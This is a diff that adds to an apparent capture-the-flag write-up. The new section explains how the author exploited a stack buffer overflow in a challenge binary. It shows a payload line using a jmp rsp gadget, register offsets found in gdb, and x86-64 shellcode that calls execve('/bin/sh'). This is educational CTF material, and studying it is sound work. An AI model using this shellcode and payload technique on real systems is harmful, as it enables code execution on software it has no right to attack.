@@ -762,9 +762,57 @@ My end goal is to call `execve('/bin/sh', 0x0, 0x0)` but the rsi & rdx register 
 
 But then I noticed that the rcx contains my input from the start
 
-- Note: I will solve it in two ways
+- Note: I will solve this challenge in two different ways
 
 ***Initial Way I Solved This During The CTF***
+
+From noticing that the `rcx` register contains my input I decided to change the control flow to the `rcx` register
+
+This is the how I calculated the offset to `rcx`
+
+Here's the payload used:
+
+```
+payload = b'A'*offset + p64(jmp_rsp) + b'\x90'*5
+```
+
+I ran my exploit to attach the process to gdb
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/25063d3a-82b2-4587-bd8a-4945d5ec5844)
+
+After the next instruction after `jmp rsp`, the `rsp & rcx` address are:
+
+```
+rsp = 0x7ffe71ee3eb0
+rcx = 0x7ffe71ee3e80
+```
+
+So the offset between the `rsp` and `rcx` is: `0x7ffe71ee3eb0 - 0x7ffe71ee3e80 = 0x30`
+
+We can also see that `r9` register is null
+
+I used that to calculate the address to `rcx` then `call rcx`
+
+Here's the assembly code to achieve that:
+
+```
+mov r9, rsp
+sub r9, 0x30
+call r9
+```
+
+Now the shellcode I wrote which is going to be executed basically just moves `/bin/sh` to the `.data` section of the binary then calls `execve('/bin/sh', 0x0, 0x0)`
+
+```
+xor esi, esi
+mov rdi, 0x68732f2f6e69622f
+mov [0x404030], rdi
+mov rcx, rsp
+mov rdi, 0x404030
+mov al, 0x3b
+cdq
+syscall
+```
+
 
 
 
